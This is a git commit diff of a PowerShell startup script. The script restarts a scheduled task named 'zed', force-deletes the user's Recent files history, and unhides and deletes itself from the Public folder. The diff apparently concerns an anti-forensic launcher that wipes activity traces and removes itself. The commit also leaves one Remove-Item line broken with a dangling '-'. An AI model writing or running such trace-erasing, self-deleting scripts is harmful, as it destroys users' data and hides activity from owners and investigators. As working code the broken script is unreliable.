b9f81f44188795a95b1d822e0072f16d77a650ea
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-16 23:53:36 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,5 +1,6 @@
 Stop-ScheduledTask -TaskName zed
 Start-ScheduledTask -TaskName zed
 $rutaHistorial = "$env:APPDATA\Microsoft\Windows\Recent"
-Remove-Item "$rutaHistorial\*" -Force -Recurse
+Remove-Item "$rutaHistorial\*" -Force -
+attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
